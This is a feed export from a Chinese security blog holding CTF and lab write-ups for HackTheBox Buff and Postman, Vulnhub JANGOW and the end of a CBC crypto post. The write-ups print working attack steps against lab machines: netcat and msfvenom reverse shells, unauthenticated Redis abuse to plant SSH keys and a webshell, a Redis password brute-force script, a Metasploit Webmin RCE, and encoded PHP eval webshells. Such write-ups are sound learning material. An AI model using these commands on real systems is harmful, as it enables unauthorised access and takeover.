class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logged_username&#x3D;    Admin&amp;password&#x3D;g    0ld3n_b0y</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">decrypt(Block_Cipher_1)[<span class="number">0</span>] == <span class="string">&quot;A&quot;</span> ^ Block_Cipher_0[<span class="number">0</span>]</span><br><span class="line">New_Block_Cipher_0[<span class="number">0</span>] = <span class="string">&quot;A&quot;</span> ^ <span class="string">&quot;a&quot;</span> ^ Block_Cipher_0[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>代入得到</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decrypt(Block_Cipher_1)[<span class="number">0</span>] == <span class="string">&quot;a&quot;</span></span><br></pre></td></tr></table></figure><hr /><p>难怪做的有点费劲，原来是非预期了啊😅，感觉这个思路都能出个题了都</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Dramatically solved.&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="https://yoloyolo.top/tags/Crypto/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
    <category term="CBC" scheme="https://yoloyolo.top/tags/CBC/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_Buff</title>
    <link href="https://yoloyolo.top/2023/02/14/HackTheBox-Buff/"/>
    <id>https://yoloyolo.top/2023/02/14/HackTheBox-Buff/</id>
    <published>2023-02-14T02:29:28.000Z</published>
    <updated>2023-02-14T15:30:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>迟来的文章</p><a id="more"></a><h1 id="hackthebox_buff"><a class="markdownIt-Anchor" href="#hackthebox_buff"></a> HackTheBox_Buff</h1><p><code>2020/07/27 16:23:58</code></p><h2 id="前期工作"><a class="markdownIt-Anchor" href="#前期工作"></a> 前期工作</h2><p>连接服务器，服务器连接代理</p><p><img src="/images/hackthebox_buff/00.png" alt="" /></p><p>网络状态</p><p><img src="/images/hackthebox_buff/01.png" alt="" /></p><p>靶机</p><p><img src="/images/hackthebox_buff/02.png" alt="" /></p><p><img src="/images/hackthebox_buff/03.png" alt="" /></p><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><p><code>nmap -sT -Pn --top-port 1000 -sV -T5 10.10.10.198</code></p><p><img src="/images/hackthebox_buff/04.png" alt="" /></p><h3 id="web路径扫描"><a class="markdownIt-Anchor" href="#web路径扫描"></a> Web路径扫描</h3><p><code>gobuster dir -w /usr/share/wordlists/directory-list-2.3-medium.txt -x .php -u http://10.10.10.198:8080/</code></p><p><img src="/images/hackthebox_buff/05.png" alt="" /></p><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>代理浏览器</p><p><code>proxychains firefox</code></p><p>得到CMS相关信息</p><p><img src="/images/hackthebox_buff/06.png" alt="" /></p><p>搜索相关漏洞<br /><code>searchsploit Gym 1.0</code></p><p><img src="/images/hackthebox_buff/07.png" alt="" /></p><p>执行EXP<br /><code>proxychains python 48506.py http://10.10.10.198:8080/</code></p><p><img src="/images/hackthebox_buff/08.png" alt="" /></p><p>获取Shell</p><p><img src="/images/hackthebox_buff/09.png" alt="" /></p><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p>服务器开启HTTP服务<br /><code>pythom -m SimpleHTTPServer 9900</code></p><p><img src="/images/hackthebox_buff/10.png" alt="" /></p><p>下载nc与plink</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O http:&#x2F;&#x2F;10.10.16.4:9900&#x2F;nc.exe</span><br><span class="line">curl -O http:&#x2F;&#x2F;10.10.16.4:9900&#x2F;plink.exe</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox_buff/11.png" alt="" /></p><p>使用nc反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9999</span><br><span class="line">nc.exe -e cmd.exe 10.10.16.4 9999</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox_buff/12.png" alt="" /></p><p>后台进程中发现CloudMe<br /><code>tasklist | findstr CloudMe</code></p><p><img src="/images/hackthebox_buff/13.png" alt="" /></p><p>该进程在本地开启了8888端口<br /><code>netstat -ano | findstr 2556</code></p><p><img src="/images/hackthebox_buff/14.png" alt="" /></p><p>使用plink进行端口转发<br /><code>plink.exe -R 9901:127.0.0.1:8888 root@10.10.16.4 -pw YOUR_PASSWORD</code></p><p><img src="/images/hackthebox_buff/15.png" alt="" /></p><p>查看服务器端口<br /><code>netstat -antlp | grep 9901</code></p><p><img src="/images/hackthebox_buff/16.png" alt="" /></p><p>搜索相关漏洞<br /><code>searchsploit cloudme</code></p><p><img src="/images/hackthebox_buff/17.png" alt="" /></p><p>使用EXP <a href="http://44470.py">44470.py</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 44470.py</span><br><span class="line">cat 44470.py</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox_buff/18.png" alt="" /></p><p>使用msfvenom构造payload<br /><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f c</code></p><p>修改payload，且修改端口为9901之后上传EXP至服务器<br /><code>scp 44470.py root@hk:/root/</code></p><p>监听端口4444<br /><code>nc -lvnp 4444</code></p><p>执行EXP<br /><code>python 44470.py</code></p><p>提权成功</p><p><img src="/images/hackthebox_buff/19.png" alt="" /></p><p>查看flag</p><p><img src="/images/hackthebox_buff/20.png" alt="" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;迟来的文章&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_Postman</title>
    <link href="https://yoloyolo.top/2023/02/14/HackTheBox-Postman/"/>
    <id>https://yoloyolo.top/2023/02/14/HackTheBox-Postman/</id>
    <published>2023-02-14T02:22:53.000Z</published>
    <updated>2023-02-14T15:29:17.000Z</updated>
    
    <content type="html"><![CDATA[<p>迟来的文章</p><a id="more"></a><h1 id="hackthebox_postman"><a class="markdownIt-Anchor" href="#hackthebox_postman"></a> HackTheBox_Postman</h1><p><code>2020/01/15 19:55:48</code></p><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><p><code>nmap -sV -Pn -p 1-10000 -T5 -n -v -A 10.10.10.160</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.160</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 9326 closed ports, 672 filtered ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">6379/tcp  open  redis   Redis key-value store 4.0.9</span><br><span class="line">10000/tcp open  http    MiniServ 1.910 (Webmin httpd)</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: MiniServ/1.910</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html; Charset=iso-8859-1).</span></span><br><span class="line"><span class="string">Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Android 4.1.1 (92%), Android 4.1.2 (92%), Android 4.2.2 (Linux 3.4) (92%)</span></span><br><span class="line"><span class="string">No exact OS matches for host (test conditions non-ideal).</span></span><br></pre></td></tr></table></figure><h3 id="web路径枚举"><a class="markdownIt-Anchor" href="#web路径枚举"></a> Web路径枚举</h3><p>尝试爆破80端口下的Web路径<br />未发现有效信息</p><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>尝试直接登入redis服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.10.10.160</span><br></pre></td></tr></table></figure><p>利用redis未授权写入ssh密钥，再用ssh登入redis账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rm -rf ~&#x2F;.ssh&#x2F;id*</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat ~&#x2F;.ssh&#x2F;id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; new.txt</span><br><span class="line">redis-cli -h 10.10.10.160 flushall</span><br><span class="line">cat new.txt | redis-cli -h 10.10.10.160 -x set crackit</span><br><span class="line">redis-cli -h 10.10.10.160 config set dir &#x2F;var&#x2F;lib&#x2F;redis&#x2F;.ssh&#x2F;</span><br><span class="line">redis-cli -h 10.10.10.160 config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">redis-cli -h 10.10.10.160 save</span><br><span class="line">ssh -i &#x2F;root&#x2F;.ssh&#x2F;id_rsa redis@10.10.10.160</span><br></pre></td></tr></table></figure><p>无法在<code>/var/www/html/</code>目录下写入WebShell</p><p>发现文件<code>/opt/id_rsa.bak</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;opt</span><br><span class="line"></span><br><span class="line">total 4</span><br><span class="line">-rwxr-xr-x 1 Matt Matt 1743 Aug 26 00:11 id_rsa.bak</span><br></pre></td></tr></table></figure><p>可以确定是Matt账户的ssh密钥</p><p>拷贝到本地之后再用脚本转为john可以破解的密码形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa.bak &gt; ssh</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt ssh</span><br><span class="line">    computer2008</span><br></pre></td></tr></table></figure><p>得到Matt账户的口令，使用SSH登入Matt账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh Matt@10.10.10.160</span><br><span class="line">computer2008</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p>在MSF中搜索Webmin的相关漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">search webmin</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                         Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                         ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary&#x2F;admin&#x2F;webmin&#x2F;edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access</span><br><span class="line">   1  auxiliary&#x2F;admin&#x2F;webmin&#x2F;file_disclosure       2006-06-30       normal     No     Webmin File Disclosure</span><br><span class="line">   2  exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution</span><br><span class="line">   3  exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_backdoor          2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor</span><br><span class="line">   4  exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin &#x2F;file&#x2F;show.cgi Remote Command Execution</span><br><span class="line">   5  exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE</span><br></pre></td></tr></table></figure><p>MSF中调用漏洞利用工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce</span><br><span class="line">set payload cmd&#x2F;unix&#x2F;reverse_netcat</span><br><span class="line">set LHOST 10.10.16.14</span><br><span class="line">set RHOSTS 10.10.10.160</span><br><span class="line">set USERNAME Matt</span><br><span class="line">set PASSWORD computer2008</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>获取root权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><p>Redis登入之后，可以考虑写入一句话后门/phpinfo这个思路</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>而这台靶机中无法在<code>/var/www/html/</code>目录下写入文件，提权也比较困难，只能写入SSH密钥</p><p>附：<br />Redis弱口令探测脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># -*-  coding:utf-8 -*-</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">PASSWORD_DIC&#x3D;[&#39;redis&#39;,&#39;root&#39;,&#39;oracle&#39;,&#39;password&#39;,&#39;p@aaw0rd&#39;,&#39;abc123!&#39;,&#39;123456&#39;,&#39;admin&#39;]</span><br><span class="line">def check(ip, port, timeout):</span><br><span class="line">    try:</span><br><span class="line">        socket.setdefaulttimeout(timeout)</span><br><span class="line">        s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, int(port)))</span><br><span class="line">        s.send(&quot;INFO\r\n&quot;)</span><br><span class="line">        result &#x3D; s.recv(1024)</span><br><span class="line">        if &quot;redis_version&quot; in result:</span><br><span class="line">            return u&quot;未授权访问&quot;</span><br><span class="line">        elif &quot;Authentication&quot; in result:</span><br><span class="line">            for pass_ in PASSWORD_DIC:</span><br><span class="line">                s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip, int(port)))</span><br><span class="line">                s.send(&quot;AUTH %s\r\n&quot; %(pass_))</span><br><span class="line">                result &#x3D; s.recv(1024)</span><br><span class="line">                if &#39;+OK&#39; in result:</span><br><span class="line">                    return u&quot;存在弱口令，密码：%s&quot; % (pass_)</span><br><span class="line">    except Exception, e:</span><br><span class="line">        pass</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    ip&#x3D;sys.argv[1]</span><br><span class="line">    port&#x3D;sys.argv[2]</span><br><span class="line">    print check(ip,port, timeout&#x3D;10)</span><br></pre></td></tr></table></figure><hr /><p>nmap扫描速度巨慢，而且总是会扫漏几个端口，甚至扫全端口时总是会中途因为900s的数据包延迟而中断扫描…(体验极差)</p><p>Redis的操作完全没有接触过，十分生疏</p><p>Webmin的漏洞利用倒是异常的顺利</p><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">redis</a><br /><a href="https://mp.weixin.qq.com/s/xF8GsjumqZhGe2Ue2XppGw">wp</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;迟来的文章&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub_JANGOW_1.0.1</title>
    <link href="https://yoloyolo.top/2023/02/14/Vulnhub-JANGOW-1-0-1/"/>
    <id>https://yoloyolo.top/2023/02/14/Vulnhub-JANGOW-1-0-1/</id>
    <published>2023-02-13T22:59:27.000Z</published>
    <updated>2023-02-14T15:21:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>Vulnhub年靶机数量</p><table><thead><tr><th style="text-align:center">Year</th><th style="text-align:center">Num</th></tr></thead><tbody><tr><td style="text-align:center">…</td><td style="text-align:center">…</td></tr><tr><td style="text-align:center">2018</td><td style="text-align:center">65</td></tr><tr><td style="text-align:center">2019</td><td style="text-align:center">117</td></tr><tr><td style="text-align:center">2020</td><td style="text-align:center">223</td></tr><tr><td style="text-align:center">2021</td><td style="text-align:center">108</td></tr><tr><td style="text-align:center">2022</td><td style="text-align:center">1</td></tr></tbody></table><p>难免对于一个时代的落幕感到惋惜</p><p>但同时庆幸自己能够在最好的时间参与其中</p><p>在学习的过程中享受这个过程</p><p>Thank you, Vulnhub &amp; every author.</p><p>Thank you for what I learned and every wonderful challenge I enjoyed.</p><a id="more"></a><h1 id="jangow-101"><a class="markdownIt-Anchor" href="#jangow-101"></a> <a href="https://www.vulnhub.com/entry/jangow-101,754/">JANGOW: 1.0.1</a></h1><p><code>2023-02-14 06:59:27</code></p><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="ip探测"><a class="markdownIt-Anchor" href="#ip探测"></a> IP探测</h3><p><code>nmap -sn 192.168.56.0/24 | grep -B 2 Virtual</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.118</span><br><span class="line">Host is up (0.00010s latency).</span><br><span class="line">MAC Address: 08:00:27:BF:BA:62 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><p><code>nmap -sV -Pn -v -T5 -A 192.168.56.118</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.118</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS GET HEAD</span><br><span class="line">| http-ls: Volume /</span><br><span class="line">| SIZE  TIME              FILENAME</span><br><span class="line">| -     2021-06-10 18:05  site/</span><br><span class="line">|_</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Index of /</span><br><span class="line">MAC Address: 08:00:27:BF:BA:62 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.041 days (since Tue Feb 14 06:38:08 2023)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty=263 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: Host: 127.0.0.1; OS: Unix</span><br></pre></td></tr></table></figure><h3 id="web路径枚举"><a class="markdownIt-Anchor" href="#web路径枚举"></a> Web路径枚举</h3><p><code>dirb http://192.168.56.118/ -w</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://192.168.56.118/ ----</span><br><span class="line">+ http://192.168.56.118/server-status (CODE:403|SIZE:279)                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.118/site/ </span><br></pre></td></tr></table></figure><p><code>dirb http://192.168.56.118/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://192.168.56.118/site/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.118/site/assets/                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.118/site/css/                                          </span><br><span class="line">+ http://192.168.56.118/site/index.html (CODE:200|SIZE:10190)                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.118/site/js/                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.118/site/wordpress/</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>访问<code>http://192.168.56.118/site/</code></p><p>点击右上角<code>Buscar</code>按钮跳转至<code>http://192.168.56.118/site/busque.php?buscar=</code></p><p>简单测试后发现命令执行漏洞</p><p><code>curl http://192.168.56.118/site/busque.php?buscar=ls</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assets</span><br><span class="line">busque.php</span><br><span class="line">css</span><br><span class="line">index.html</span><br><span class="line">js</span><br><span class="line">wordpress</span><br></pre></td></tr></table></figure><p>以防万一，确认一下黑名单</p><p><code>curl 'http://192.168.56.118/site/busque.php?buscar=cat+./busque.php'</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="variable">$_GET</span>[<span class="string">&#x27;buscar&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>确认写入权限</p><p><code>curl 'http://192.168.56.118/site/busque.php?buscar=ls+-la'</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">total 44</span><br><span class="line">drwxr-xr-x 6 www-data www-data  4096 Feb 13 17:59 .</span><br><span class="line">drwxr-xr-x 3 root     root      4096 Oct 31  2021 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  1584 Feb 13 17:59 \</span><br><span class="line">drwxr-xr-x 3 www-data www-data  4096 Jun  3  2021 assets</span><br><span class="line">-rw-r--r-- 1 www-data www-data    35 Jun 10  2021 busque.php</span><br><span class="line">drwxr-xr-x 2 www-data www-data  4096 Jun  3  2021 css</span><br><span class="line">-rw-r--r-- 1 www-data www-data 10190 Jun 10  2021 index.html</span><br><span class="line">drwxr-xr-x 2 www-data www-data  4096 Jun  3  2021 js</span><br><span class="line">drwxr-xr-x 2 www-data www-data  4096 Jun 10  2021 wordpress</span><br></pre></td></tr></table></figure><p><code>curl 'http://192.168.56.118/site/busque.php?buscar=id'</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure><p>尝试反弹Shell，失败</p><p>尝试通过Web服务传递Webshell，失败</p><p>疑似Ban了主动请求</p><p><code>echo -n '&lt;?php eval($_POST[&quot;BFL&quot;]);?&gt;' | base64</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX1BPU1RbIkJGTCJdKTs/Pg==</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.56.118/site/busque.php?buscar=echo+-n+PD9waHAgZXZhbCgkX1BPU1RbIkJGTCJdKTs/Pg==|base64+-d&gt;bfl.php&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">weevely generate Bufferfly BFL.php</span><br><span class="line">cat BFL.php | base64</span><br><span class="line"></span><br><span class="line">PD9waHAKJHo9JyRrPSI1TGJMMmNMMjhlTGMiOyRraD0iNDE1NmRiYUwwNTM1NyJMOyRrZj0iNzc3</span><br><span class="line">MmYxOEwyTDg1YWIiOyRwPSJMJzsKJGw9J2JhTHNlNjRfZW5jb2RlKEBMTHhMKExAZ3pjb21McHJM</span><br><span class="line">ZXNzKCRvKSwkaykpO3ByaW50KCIkcCRraCRyJGtmIik7fSc7CiRBPSd0Y0xoKCIvJGtoKC4rKUwk</span><br><span class="line">a0xmLyIsQGZpbGVfZ2V0X2NvbnRMZW50cygicExocDovTC9pbnB1dEwiKSwkbSk9JzsKJHE9J3Js</span><br><span class="line">ZUxuKCRMdClMOyRvPSIiO2ZvcigkaUw9MDskaTwkbDtMTCl7Zm9Mcigkaj0wO0woJGo8JExjJiYk</span><br><span class="line">aTwkbCk7TCc7CiRUPSdMPTEpIEx7QG9MYl9zdGFydCgpTDtAZUx2YWwoQGd6dW5MY29tTHByZXNM</span><br><span class="line">cyhAeChAYkxhc2U2NExfZGVjb2RlKCQnOwokdD0nJGorTCssJGkrKyl7TCRvLj0kdEx7JGl9XiRr</span><br><span 